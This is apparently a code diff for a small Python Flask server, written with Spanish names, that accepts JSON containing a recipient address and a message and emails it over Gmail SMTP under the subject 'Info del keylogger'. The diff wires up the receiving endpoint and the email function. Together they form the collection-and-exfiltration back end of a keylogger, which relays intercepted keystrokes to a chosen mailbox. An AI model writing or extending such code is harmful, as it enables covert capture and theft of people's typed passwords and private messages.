@@ -7,17 +7,17 @@ from email.message import EmailMessage
 import ssl
 import smtplib
 
-import flask as Flask
+from flask import Flask, request
 
 email_sender = 'mymailera@gmail.com'
 email_password = os.getenv('APP_PASSWORD')
 
 
-def send_email(mail, correo):
+def send_email(mail, mensaje):
 
-  email_receiver = 'xxxx@mail.com'
+  email_receiver = mail
   subject = "Info del keylogger"
-  body = f"El keylogger interceptó todo esto: {mail}"
+  body = f"El keylogger interceptó todo esto: {mensaje}"
 
   em = EmailMessage()
 
@@ -43,10 +43,9 @@ def enviar():
   input_json = request.get_json(force=True) 
   # force=True, above, is necessary if another developer 
   # forgot to set the MIME type to 'application/json'
-  print 'data from client:', input_json
-  #dictToReturn = {'answer':42}
-  #return jsonify(dictToReturn)
+  send_email(input_json["correo"], input_json["mensaje"])
 
+  return f'{input_json["mensaje"]}'
 
 
 if __name__ == '__main__':
